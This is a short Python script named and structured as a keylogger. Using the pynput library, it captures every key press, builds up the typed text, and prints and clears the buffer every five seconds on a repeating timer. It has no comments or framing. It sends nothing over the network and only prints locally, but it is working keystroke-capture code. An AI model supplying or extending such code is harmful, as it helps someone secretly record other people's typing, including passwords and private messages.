import threading
import pynput.keyboard



events = ""


class Keylogger():

	def __init__(self):
		self.first()


	def key_touched(self, key):

		global events

		try:
			events = events + str(key.char)
		except:
			if key == key.space:
				events = events + " "
			else:
				events = events + " " + str(key) + " "


	def save(self):

		global events

		print(events)
		events = ""

		save_timer = threading.Timer(5, self.save)
		save_timer.start()


	def first(self):

		key_detector = pynput.keyboard.Listener(on_press=self.key_touched)

		with key_detector:

			self.save()
			key_detector.join()



if __name__ == '__main__':

    keylogger = Keylogger()
